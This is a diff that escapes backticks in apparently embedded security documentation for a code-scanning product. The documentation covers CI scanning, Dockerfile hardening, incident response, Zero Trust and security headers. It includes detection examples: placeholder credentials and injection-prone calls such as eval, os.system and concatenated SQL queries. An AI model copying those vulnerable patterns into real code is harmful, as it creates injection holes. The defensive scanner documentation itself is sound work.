-```yaml
+\`\`\`yaml
 - name: Scan for secrets
   uses: gitleaks/gitleaks-action@v2
   env:
-    GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-```
+    GITHUB_TOKEN: \${{ secrets.GITHUB_TOKEN }}
+\`\`\`
 
 ## Dependency Scanning in CI
 
-```yaml
+\`\`\`yaml
 - name: Security audit
   run: |
     npm audit --audit-level=high
     # Fails build if high or critical vulnerabilities found
-```
+\`\`\`
 
 ## Container Image Scanning
 
-```yaml
+\`\`\`yaml
 - name: Scan container image
   uses: aquasecurity/trivy-action@master
   with:
     image-ref: 'myapp:latest'
     exit-code: '1'
     severity: 'CRITICAL,HIGH'
-```
+\`\`\`
 
 ## Secure Dockerfile
 
-```dockerfile
+\`\`\`dockerfile
 # Use specific version tags, not :latest (prevents uncontrolled updates)
 FROM node:20.12.2-alpine3.19
 
@@ -1039,7 +1048,7 @@ RUN npm ci --only=production && npm cache clean --force
 
 # Health check
 HEALTHCHECK --interval=30s --timeout=3s CMD node healthcheck.js
-```
+\`\`\`
 
 ## Penetration Testing Schedule
 
@@ -1075,7 +1084,7 @@ How you'll know you've been breached:
 
 ### Phase 3 — Containment (Within Minutes)
 
-```bash
+\`\`\`bash
 # Immediate actions — preserve evidence first
 # DO NOT wipe or shut down servers before forensic preservation
 
@@ -1083,7 +1092,7 @@ How you'll know you've been breached:
 # 2. Rotate ALL potentially exposed credentials immediately
 # 3. Block attacker IPs at the firewall
 # 4. Enable maximum-verbosity logging
-```
+\`\`\`
 
 ### Phase 4 — Eradication
 
@@ -1180,7 +1189,7 @@ How you'll know you've been breached:
 
 ## The Analysis Prompt Structure
 
-```javascript
+\`\`\`javascript
 // System instruction (simplified)
 const systemPrompt = \`You are an elite DevSecOps code remediation engine.
 Analyze the provided code vulnerabilities and return ONLY valid JSON:
@@ -1197,7 +1206,7 @@ VULNERABILITIES DETECTED:
 - Line 4: XSS_VECTOR (high) — document.write with unvalidated input
 Return ONLY the JSON.
 \`;
-```
+\`\`\`
 
 ## Output Validation Pipeline
 
@@ -1225,43 +1234,43 @@ DevGuard Pro shows a user-friendly countdown timer when the rate limit is hit.`
 ### Secrets Detection
 Detects credentials hardcoded in source files:
 
-```javascript
+\`\`\`javascript
 // All of these are flagged
 const API_KEY = "AKIAIOSFODNN7EXAMPLE";      // AWS key format
 const token = "ghp_16abcXyZ...";             // GitHub personal access token
 const password = "MySecretPassword1";        // Generic password variable
 const key = "sk_live_abc123...";             // Stripe live key
 const connection = "mongodb://user:pass@host"; // Connection string with creds
-```
+\`\`\`
 
 ### Dangerous Function Calls
-```javascript
+\`\`\`javascript
 // JavaScript/TypeScript
 eval(userInput)                              // Code injection
 new Function(userInput)()                    // Same as eval
 setTimeout("code string", 1000)              // String-form setTimeout
 document.write(variable)                     // DOM XSS vector
 dangerouslySetInnerHTML={{ __html: input }}  // React XSS
-```
+\`\`\`
 
-```python
+\`\`\`python
 # Python
 exec(user_input)                             # Code injection
 eval(user_expression)                        # Expression injection
 subprocess.call(cmd, shell=True)             # Command injection
 os.system(user_cmd)                          # Command injection
-```
+\`\`\`
 
 ### SQL Injection Patterns
-```javascript
+\`\`\`javascript
 // Any string concatenation adjacent to SQL keywords
 db.query("SELECT " + req.body.field + " FROM users")
 db.query(\`SELECT * FROM orders WHERE id = \${req.params.id}\`)
 "SELECT * FROM users WHERE email = '" + email + "'"
-```
+\`\`\`
 
 ### Cryptographic Weaknesses
-```javascript
+\`\`\`javascript
 // Weak algorithms
 crypto.createHash('md5')                     // MD5 — cryptographically broken
 crypto.createHash('sha1')                    // SHA1 — deprecated for security
@@ -1270,7 +1279,7 @@ Math.random()                                // Not cryptographically secure
 // Correct alternatives
 crypto.randomBytes(32)                       // Cryptographically secure random
 crypto.createHash('sha256')                  // Acceptable for non-password use
-```
+\`\`\`
 
 ## Severity Classification
 
@@ -1389,7 +1398,7 @@ A valid user credential from a compromised device is **not** a valid login. Requ
 
 ### 5. Explicit Network Microsegmentation
 
-```yaml
+\`\`\`yaml
 # Kubernetes NetworkPolicy example
 apiVersion: networking.k8s.io/v1
 kind: NetworkPolicy
@@ -1407,7 +1416,7 @@ spec:
     ports:
     - protocol: TCP
       port: 5432
-```
+\`\`\`
 
 > **Zero Trust does NOT mean "no trust"** — it means trust is **dynamic** (reassessed continuously), **contextual** (same user gets different access in different contexts), and **minimal** (only what's needed for the current task).`
       },
@@ -1419,7 +1428,7 @@ spec:
 
 The most powerful security header. Prevents XSS, data injection, and clickjacking.
 
-```
+\`\`\`
 Content-Security-Policy: 
   default-src 'self';
   script-src 'self' 'nonce-{randomPerRequest}';
@@ -1430,15 +1439,15 @@ Content-Security-Policy:
   base-uri 'self';
   form-action 'self';
   upgrade-insecure-requests;
-```
+\`\`\`
 
 ## Strict-Transport-Security (HSTS)
 
 Forces browsers to always use HTTPS for your domain:
 
-```
+\`\`\`
 Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
-```
+\`\`\`
 
 Submit to **HSTS Preload List** at [hstspreload.org](https://hstspreload.org) — your domain is built into browsers' HTTPS-only list before the first request.
 
@@ -1446,15 +1455,15 @@ Submit to **HSTS Preload List** at [hstspreload.org](https://hstspreload.org) �
 
 Restrict browser feature access:
 
-```
+\`\`\`
 Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=(), usb=()
-```
+\`\`\`
 
 Prevents any JavaScript (including XSS payloads) from accessing these APIs.
 
 ## Full Header Implementation (Express.js)
 
-```javascript
+\`\`\`javascript
 const helmet = require('helmet');
 
 app.use(helmet({
@@ -1469,7 +1478,7 @@ app.use((req, res, next) => {
   res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');
   next();
 });
-```
+\`\`\`
 
 ## Security Headers Grading
 
